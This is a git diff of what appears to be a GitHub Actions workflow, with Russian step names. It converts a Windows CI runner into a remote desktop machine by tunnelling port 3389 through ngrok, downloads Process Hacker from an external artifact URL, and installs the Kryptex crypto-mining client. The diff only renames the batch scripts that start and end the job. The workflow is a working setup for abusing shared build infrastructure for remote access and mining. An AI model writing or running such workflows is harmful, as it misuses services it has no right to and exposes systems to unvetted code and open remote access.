@@ -32,7 +32,7 @@ jobs:
     - name: Создание туннелей.
       run: Start-Process Powershell -ArgumentList '-Noexit -Command ".\ngrok\ngrok.exe tcp --region eu 3389"'
     - name: Подключение к VDS.
-      run: cmd /c start.bat
+      run: cmd /c install.bat
     - name: Загрузка Process Hacker.
       run: |
         Invoke-WebRequest https://ci.appveyor.com/api/buildjobs/13enx0gti83o5h2r/artifacts/processhacker-3.0.4234-bin.zip -OutFile "ProccesHacker.zip"
@@ -51,4 +51,4 @@ jobs:
     - name: Установка Kryptex.
       run: .\kryptex-setup.exe
     - name: Запуск виртуальной машины выполнен
-      run: cmd /c loop.bat
+      run: cmd /c exit.bat
